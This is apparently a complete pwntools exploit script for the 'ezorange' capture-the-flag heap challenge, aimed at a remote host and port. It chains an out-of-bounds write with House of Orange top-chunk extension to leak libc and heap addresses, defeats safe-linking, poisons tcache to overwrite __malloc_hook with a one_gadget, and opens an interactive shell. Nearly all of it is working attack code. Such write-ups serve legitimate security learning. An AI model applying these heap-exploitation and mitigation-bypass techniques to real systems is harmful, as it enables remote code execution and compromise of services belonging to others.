#!/usr/bin/env python3

#This program has a out of bounds write but no free is present
#So we are using the top length extension method in house of orange to trigger a free to get libc and heap leak
#And then using this oob write to perform  tcache poisoning to get RCE

from pwn import *

e = ELF("./ezorange")
#r = process("./ezorange")
r = remote("104.197.118.147",10160)
libc = ELF("./libc.so.6")


def buy(number,size):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Orange number:",f"{number}")
    r.sendlineafter(b"Size:",f"{size}")

def modify(number,index,value):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"number:",f"{number}")
    r.sendlineafter(b"index:",f"{index}")
    r.sendlineafter(b"New value:",f"{value}")

def read_libc_leak(number,start):
    i = 0
    val = 0
    while(i < 6):
        r.sendlineafter(b">",b"2")
        r.sendlineafter(b"number:",f"{number}")
        r.sendlineafter(b"index:",f"{start+i}")
        r.recvuntil(b"Current value: ")
        tmp = int(r.recvline())
        val+= tmp << (8 * i)
        r.sendlineafter(b"New value:",f"{tmp}")
        i+=1
    return val

def read_heap_leak(number,start):
    i = 0
    val = 0
    while(i < 6):
        r.sendlineafter(b">",b"2")
        r.sendlineafter(b"number:",f"{number}")
        r.sendlineafter(b"index:",f"{start+i}")
        r.recvuntil(b"Current value: ")
        tmp = int(r.recvline())
        val+= tmp << (8 * i)
        r.sendlineafter(b"New value:",f"{tmp}")
        i+=1
    return val

buy(0,136)
modify(0,138,0)
buy(1,0xd00)
log.info("First top length extension triggered using oob write to get libc leak")
libc_base = read_libc_leak(0,144) - 0x1c5c00
log.info("The libc base of the process is " + hex(libc_base))
for i in range(0,9):
    buy(1,0x328)
modify(1,0x32a,0)
buy(0,0x330)
log.info("Second top length extension triggered using oob write to get heap leak to bypass safe linking mitigation")
heap_base = read_heap_leak(1,0x338) - 0x10
log.info("The heap base of the process is " + hex(heap_base))
for i in range(0,7):
    buy(1,0x338)
buy(1,0x2f8)
modify(1,0x2fa,0)
buy(0,0x370)
log.info("Final top length extension triggered using oob write to perform tcache poison to get RCE")
val = hex((libc_base + libc.sym.__malloc_hook) ^ ((heap_base + 0x44d10) >> 12))
for i in reversed(range(7)):
    if(i == 0):
        break
    j = -(i - 6)
    modify(1,0x300+j,int(val[i*2:(i*2)+2],16))
buy(1,0x2d8)
buy(1,0x2d8)
val = hex(libc_base + 0xceb71)
for i in reversed(range(7)):
    if(i == 0):
        break
    j = -(i - 6)
    modify(1,j,int(val[i*2:(i*2)+2],16))
buy(1,1337)
r.interactive()
